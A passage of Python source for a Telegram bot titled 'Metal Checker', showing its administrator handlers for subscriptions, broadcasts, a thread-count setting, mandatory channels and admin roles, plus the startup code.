def process_administrative_subscription_strip(message):
    target = message.text.strip() if message.text else ""
    with db_lock:
        if target in db["users"]:
            del db["users"][target]
            save_database()
            bot.send_message(message.chat.id, f"✅ Target Account subscription verification parameters revoked for ID: `{target}`")
            return
    bot.send_message(message.chat.id, "❌ ID match tracking resolution failure.")

def process_administrative_broadcast_emission(message):
    body = message.text if message.text else ""
    if not body: return
    
    with db_lock:
        recipients = list(db["users"].keys())
        for a in db["admins"]:
            if str(a) not in recipients: recipients.append(str(a))

    bot.send_message(message.chat.id, "📢 *Dispersing system broadcast signal matrix across users...*")
    count = 0
    for r in recipients:
        try:
            bot.send_message(int(r), f"📢 *Alert Matrix Notification from Icardi:*\n\n{body}")
            count += 1
            time.sleep(0.05)
        except Exception: pass
    bot.send_message(message.chat.id, f"🏁 Broadcast processing cycle completed. Successful target delivery: `{count}`")

# ══════════════════════════════════════════════════════════════════════
#  SETTINGS MATRIX CONFIGURATION CONTROLLERS
# ══════════════════════════════════════════════════════════════════════
@bot.callback_query_handler(func=lambda call: call.data.startswith("cb_set_"))
def settings_dynamic_reconfiguration_hub(call):
    uid = call.from_user.id
    if uid not in db["admins"] and uid != OWNER_ID: return

    setting_target = call.data.replace("cb_set_", "")

    if setting_target == "threads":
        p = bot.send_message(call.message.chat.id, "🔢 Input new total concurrent thread allocation value limit (1-100):")
        bot.register_next_step_handler(p, process_threads_setting_update)

def process_threads_setting_update(message):
    try:
        val = int(message.text.strip())
        if not (1 <= val <= 100): raise ValueError
        with db_lock:
            db["settings"]["threads"] = str(val)
            save_database()
        bot.send_message(message.chat.id, f"✅ Core concurrency metrics updated successfully to: `{val}` threads.")
    except Exception:
        bot.send_message(message.chat.id, "❌ Format Violation: Specify an integer range from 1 to 100.")

# ══════════════════════════════════════════════════════════════════════
#  MANDATORY CHANNELS SUITE CONFIGURATION CONTROLLERS
# ══════════════════════════════════════════════════════════════════════
@bot.callback_query_handler(func=lambda call: call.data.startswith("cb_ch_"))
def mandatory_channels_routing_hub(call):
    uid = call.from_user.id
    if uid not in db["admins"] and uid != OWNER_ID: return

    sel = call.data

    if sel == "cb_ch_view":
        with db_lock: channels = list(db["channels"])
        if not channels: bot.edit_message_text("🌐 No forced channels configurations currently active.", call.message.chat.id, call.message.message_id)
        else:
            fmt = "\n".join([f"🔹 {c}" for c in channels])
            bot.edit_message_text(f"🌐 *Enforced Forced Channels:* \n\n{fmt}", call.message.chat.id, call.message.message_id)
    elif sel == "cb_ch_clear":
        with db_lock: db["channels"] = []; save_database()
        bot.edit_message_text("🗑️ Channels verification enforcement indices dropped.", call.message.chat.id, call.message.message_id)
    elif sel == "cb_ch_add":
        p = bot.send_message(call.message.chat.id, "✍️ Dispatched target handle configuration tag layout (e.g., `@MyChannel`):")
        bot.register_next_step_handler(p, process_channel_addition_routine)

def process_channel_addition_routine(message):
    handle = message.text.strip() if message.text else ""
    if not handle.startswith("@"):
        bot.send_message(message.chat.id, "❌ Syntax Failure: Include `@` handle tag initializers.")
        return
    with db_lock:
        if handle not in db["channels"]:
            db["channels"].append(handle)
            save_database()
    bot.send_message(message.chat.id, f"✅ Enforcement requirement criteria assigned to context: `{handle}`")

# ══════════════════════════════════════════════════════════════════════
#  ROLE MANAGERS SCHEMAS PIPELINE
# ══════════════════════════════════════════════════════════════════════
@bot.callback_query_handler(func=lambda call: call.data.startswith("cb_role_"))
def admin_role_allocation_router(call):
    if call.from_user.id != OWNER_ID: return

    if call.data == "cb_role_add":
        p = bot.send_message(call.message.chat.id, "👤 Provide target User ID token to grant Administrator access parameters:")
        bot.register_next_step_handler(p, process_role_addition_logic)
    elif call.data == "cb_role_rem":
        p = bot.send_message(call.message.chat.id, "👤 Provide target User ID token to strip Administrative access parameters:")
        bot.register_next_step_handler(p, process_role_removal_logic)

def process_role_addition_logic(message):
    try: target_id = int(message.text.strip())
    except Exception: return
    with db_lock:
        if target_id not in db["admins"]:
            db["admins"].append(target_id)
            save_database()
    bot.send_message(message.chat.id, f"✅ Elevated user verification permissions to administrator scope: `{target_id}`")

def process_role_removal_logic(message):
    try: target_id = int(message.text.strip())
    except Exception: return
    if target_id == OWNER_ID: return
    with db_lock:
        if target_id in db["admins"]:
            db["admins"].remove(target_id)
            save_database()
    bot.send_message(message.chat.id, f"✅ Revoked administrator tracking status access privileges: `{target_id}`")

# ══════════════════════════════════════════════════════════════════════
#  GLOBAL CONSUMER SYSTEM FALLBACK INTERCEPTORS
# ══════════════════════════════════════════════════════════════════════
@bot.message_handler(func=lambda m: True)
def default_catchall_unmapped_message_consumer(message):
    uid = message.from_user.id
    bot.send_message(
        message.chat.id, 
        "ℹ️ Interaction sequence unrecognized. Use the physical dashboard components mapped below:", 
        reply_markup=build_main_dashboard(uid)
    )

# ══════════════════════════════════════════════════════════════════════
#  APPLICATION LIFECYCLE ENTER GATEWAY
# ══════════════════════════════════════════════════════════════════════
if __name__ == "__main__":
    print("=====================================================")
    print("  Metal Checker Security Framework Initializing...   ")
    print("  Developer: Icardi                                  ")
    print("  Powered by: Metal Drops                            ")
    print("=====================================================")
    bot.infinity_polling(timeout=60, long_polling_timeout=30)

